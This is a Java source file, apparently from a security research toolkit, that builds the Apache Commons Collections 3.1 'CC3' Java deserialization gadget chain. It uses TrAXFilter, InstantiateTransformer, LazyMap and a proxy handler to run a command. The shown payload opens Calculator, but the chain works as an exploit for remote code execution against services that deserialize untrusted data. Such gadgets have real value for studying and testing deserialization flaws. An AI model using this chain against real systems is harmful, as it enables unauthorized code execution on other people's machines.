package com.p2hm1n.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;


import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * CommonsCollections3 的 gadget
 * 测试环境 JDK8u45
 *
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CC3 {
    public static void main(String[] args) throws Exception{
        Object templatesImpl = Gadgets.createTemplatesImpl("open -a Calculator");

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templatesImpl } )};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        PayloadRunner.run(handler);
    }
}
